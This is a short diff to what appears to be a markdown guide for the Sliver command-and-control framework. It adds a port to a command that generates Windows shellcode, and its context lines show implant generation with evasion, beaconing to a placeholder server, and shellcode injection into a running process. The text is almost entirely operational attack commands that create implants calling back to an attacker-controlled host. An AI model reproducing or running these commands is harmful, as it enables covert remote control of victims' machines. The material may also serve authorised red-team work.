@@ -30,7 +30,7 @@ sliver (session) > execute-shellcode -p 1234 shellcode.bin
 **Step 1: Generate beacon with evasion**
 ```bash
 sliver > generate beacon --http your-server.com:8443 --os windows --evasion --save /path/to/file/
-sliver > generate --mtls your-server --os windows --arch amd64 --format shellcode --save /opt/Sliver_Loader/sliver.bin
+sliver > generate --mtls your-server:8888 --os windows --arch amd64 --format shellcode --save /opt/Sliver_Loader/sliver.bin
 ```
 
 **Step 2: Start C2 listener**
